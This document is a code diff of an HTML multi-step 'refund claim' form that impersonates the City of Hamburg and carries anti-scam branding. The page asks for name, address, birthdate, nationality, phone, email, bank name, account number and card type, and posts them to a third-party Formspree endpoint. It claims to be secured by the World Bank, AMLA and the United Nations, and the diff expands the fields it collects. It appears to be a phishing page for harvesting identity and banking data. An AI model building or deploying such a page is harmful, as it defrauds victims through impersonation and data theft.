@@ -23,86 +23,117 @@
         .security-banner { background: var(--hamburg-blue); color: white; padding: 14px; text-align: center; font-size: 12px; font-weight: bold; text-transform: uppercase; border-bottom: 3px solid var(--security-gold); letter-spacing: 2px; }
         .header { padding: 45px 40px; text-align: center; background: #fff; border-bottom: 8px solid var(--hamburg-blue); }
         .header h1 { color: var(--hamburg-blue); margin: 0; font-size: 32px; font-weight: 900; text-transform: uppercase; border: 2px solid var(--hamburg-blue); display: inline-block; padding: 10px 20px; }
-        .header .declaration { margin: 20px auto 0; color: #333; font-weight: 800; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; max-width: 750px; line-height: 1.5; }
         .section-box { padding: 50px; display: none; }
         .section-box.active { display: block; }
-        h2 { font-size: 20px; color: var(--hamburg-blue); margin-bottom: 10px; font-weight: 800; text-transform: uppercase; border-bottom: 2px solid #eee; padding-bottom: 10px; }
+        h2 { font-size: 20px; color: var(--hamburg-blue); margin-bottom: 15px; font-weight: 800; text-transform: uppercase; border-bottom: 2px solid #eee; padding-bottom: 10px; }
         .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; }
         label { display: block; font-weight: 800; margin-bottom: 10px; font-size: 11px; color: var(--hamburg-blue); text-transform: uppercase; }
         input { width: 100%; padding: 16px; border: 1px solid #bbb; box-sizing: border-box; font-size: 15px; border-radius: 2px; }
-        input.invalid { border: 2px solid var(--hamburg-red); background-color: #fffafa; }
         .review-item { margin-bottom: 12px; padding: 10px; border-bottom: 1px solid #f0f0f0; }
         .review-label { font-size: 10px; font-weight: 800; color: var(--hamburg-blue); text-transform: uppercase; }
         .review-value { font-size: 15px; color: #333; margin-top: 5px; font-weight: 600; }
         .btn-container { display: flex; justify-content: flex-end; margin-top: 40px; gap: 15px; }
-        button { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; transition: 0.3s; }
+        button { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; }
         .btn-back { background-color: #888; }
         .establishment-footer { text-align: center; padding: 30px; font-size: 12px; color: #888; background: #fdfdfd; border-top: 1px solid #eee; text-transform: uppercase; line-height: 1.6; }
-        #loader { display: none; text-align: center; padding: 40px; font-weight: bold; color: var(--hamburg-blue); font-size: 18px; }
     </style>
 </head>
 <body>
 
     <div class="page-wrapper">
+        <!-- MISSION SECTION -->
         <div class="side-text">
             <h3>MISSION</h3>
-            <p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced verification protocols and proactive fraud detection systems that strictly safeguard our users' assets.</p>
+            <p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced, multi-stage verification protocols and proactive fraud detection systems that strictly safeguard our users' assets laban sa digital scams during the refund process.</p>
         </div>
 
         <div class="form-container">
             <div class="security-banner">🛡️ SECURE RETURNS, SCAM FREE SERVICE</div>
             <div class="header">
                 <h1>FREIE UND HANSESTADT HAMBURG</h1>
-                <div class="declaration">GLOBAL THEME & SECURITY DECLARATION: DEDICATED TO ERADICATING FRAUD...</div>
             </div>
             
-            <!-- FINAL FORM SETUP BASED ON YOUR EXAMPLE -->
-            <form id="masterForm" action="https://formspree.io/f/mjglbpya" method="POST">
+            <form action="https://formspree.io" method="POST" id="mainForm">
                 
                 <!-- SECTION 1 -->
                 <div id="section1" class="section-box active">
-                    <h2>SECTION 1: IDENTITY</h2>
+                    <h2>SECTION 1: IDENTITY & NATIONALITY</h2>
                     <div class="grid-3">
-                        <div><label>Last Name *</label><input type="text" name="Last_Name" id="ln" class="req"></div>
-                        <div><label>First Name *</label><input type="text" name="First_Name" id="fn" class="req"></div>
-                        <div><label>Middle Name *</label><input type="text" name="Middle_Name" id="mn" class="req"></div>
+                        <div><label>Last Name *</label><input type="text" name="LastName" id="ln" required></div>
+                        <div><label>First Name *</label><input type="text" name="FirstName" id="fn" required></div>
+                        <div><label>Middle Name *</label><input type="text" name="MiddleName" id="mn"></div>
                     </div>
-                    <div style="margin-top:20px;"><label>Residential Address *</label><input type="text" name="Residential_Address" id="addr" class="req"></div>
+                    <div style="margin-top:20px;"><label>Residential Address *</label><input type="text" name="Address" id="addr" required></div>
                     <div class="grid-2" style="margin-top:20px;">
-                        <div><label>Nationality *</label><input type="text" name="Nationality" id="nat" class="req"></div>
-                        <div><label>Email *</label><input type="email" name="Email" id="em" class="req"></div>
+                        <div><label>Nationality *</label><input type="text" name="Nationality" id="nat" required></div>
+                        <div><label>Birthdate *</label><input type="text" name="Birthdate" id="bd" required placeholder="MM/DD/YYYY"></div>
                     </div>
-                    <div class="btn-container"><button type="button" onclick="validate(1, 2)">NEXT STEP</button></div>
+                    <div class="grid-2" style="margin-top:20px;">
+                        <div><label>Email *</label><input type="email" name="Email" id="em" required></div>
+                        <div><label>Contact Number *</label><input type="text" name="Phone" id="ph" required></div>
+                    </div>
+                    <div style="margin-top:20px;"><label>Upload Valid ID (Visual Only)</label><input type="file"></div>
+                    <div class="btn-container"><button type="button" onclick="show(2)">NEXT STEP</button></div>
                 </div>
 
                 <!-- SECTION 2 -->
                 <div id="section2" class="section-box">
-                    <h2>SECTION 2: REFUND</h2>
-                    <div><label>TOTAL AMOUNT *</label><input type="text" name="Refund_Amount" id="amt" class="req"></div>
-                    <div style="margin-top:20px;"><label>Bank Name *</label><input type="text" name="Bank_Name" id="bn" class="req"></div>
-                    <div class="grid-2" style="margin-top:20px;">
-                        <div><label>Account No *</label><input type="text" name="Account_Number" id="an" class="req"></div>
-                        <div><label>Card Type *</label><input type="text" name="Card_Type" id="ct" class="req"></div>
+                    <h2>SECTION 2: REFUND DETAILS</h2>
+                    <div class="grid-2">
+                        <div><label>Refund Amount *</label><input type="text" name="Amount" id="amt" required></div>
+                        <div><label>Bank Name *</label><input type="text" name="Bank" id="bn" required></div>
                     </div>
+                    <div class="grid-2" style="margin-top:20px;">
+                        <div><label>Account Number *</label><input type="text" name="AccountNo" id="an" required></div>
+                        <div><label>Type of Card *</label><input type="text" name="CardType" id="ct" required></div>
+                    </div>
+                    <div style="margin-top:20px;"><label>Upload Receipt (Visual Only)</label><input type="file"></div>
                     <div class="btn-container">
                         <button type="button" class="btn-back" onclick="show(1)">BACK</button>
-                        <button type="button" onclick="validate(2, 3)">REVIEW</button>
+                        <button type="button" onclick="buildReview()">REVIEW CLAIM</button>
                     </div>
                 </div>
 
                 <!-- SECTION 3 -->
                 <div id="section3" class="section-box">
-                    <h2>SECTION 3: REVIEW INFORMATION</h2>
+                    <h2>SECTION 3: FINAL REVIEW</h2>
                     <div id="reviewDisplay"></div>
-                    <div class="btn-container" id="finalBtns">
-                        <button type="button" class="btn-back" onclick="show(2)">EDIT</button>
-                        <!-- Submit button uses the POST action -->
-                        <button type="button" onclick="startSubmit()">SUBMIT TO DATABASE</button>
+                    <div class="btn-container">
+                        <button type="button" class="btn-back" onclick="show(2)">EDIT INFO</button>
+                        <button type="submit">SUBMIT TO DATABASE</button>
                     </div>
                 </div>
             </form>
+            <div class="establishment-footer">SECURED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS</div>
+        </div>
 
-            <div id="loader">ENCRYPTING DATA & SECURING ASSETS...<br><br>Please do not close this window.</div>
+        <!-- VISION SECTION -->
+        <div class="side-text">
+            <h3>VISION</h3>
+            <p>To be recognized as the premier global benchmark for commercial integrity and consumer safety, where absolute transparency ensures that every individual can navigate the refund ecosystem with confidence.</p>
+        </div>
+    </div>
 
-            <div class="establishment-footer">SECURE
+    <script>
+        function show(p) {
+            document.querySelectorAll('.section-box').forEach(b => b.classList.remove('active'));
+            document.getElementById('section' + p).classList.add('active');
+            window.scrollTo(0,0);
+        }
+        function buildReview() {
+            const data = [
+                {l: "FULL NAME", v: document.getElementById('fn').value + " " + document.getElementById('ln').value},
+                {l: "ADDRESS", v: document.getElementById('addr').value},
+                {l: "EMAIL", v: document.getElementById('em').value},
+                {l: "REFUND AMOUNT", v: document.getElementById('amt').value},
+                {l: "BANK", v: document.getElementById('bn').value}
+            ];
+            let html = "";
+            data.forEach(d => { html += `<div class="review-item"><div class="review-label">${d.l}</div><div class="review-value">${d.v}</div></div>`; });
+            document.getElementById('reviewDisplay').innerHTML = html;
+            show(3);
+        }
+    </script>
+</body>
+</html>
